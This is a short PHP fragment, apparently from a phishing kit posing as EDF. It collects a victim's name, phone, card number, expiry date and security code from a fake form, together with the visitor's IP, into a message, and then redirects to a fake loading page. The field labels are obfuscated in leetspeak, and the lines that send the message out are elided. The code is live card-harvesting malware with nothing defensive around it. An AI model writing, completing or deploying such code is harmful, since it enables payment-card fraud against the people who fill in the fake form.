...
$message .= "EDF Info \n";
$message .= "Date  :   $date                              \n";
$message .= "N4me     :   ".$_POST['0ow2_1']." ".$_POST['0ow2_2']."\n";
$message .= "phone    :   ".$_POST['0ow2_3']."\n";
$message .= "C4rd     :   ".$_POST['0ow2_4']."\n";
$message .= "3xp      :   ".$_POST['0ow2_5']."\n";
$message .= "C0de     :   ".$_POST['0ow2_6']."\n";
$message .= "▪▪▪▪ \n";
$message .= "from ip  :   $ip                              \n";
...
header('Location: ../loading_.php?S'.$random1.'?id'.$random2.'?task'.$random3.'');
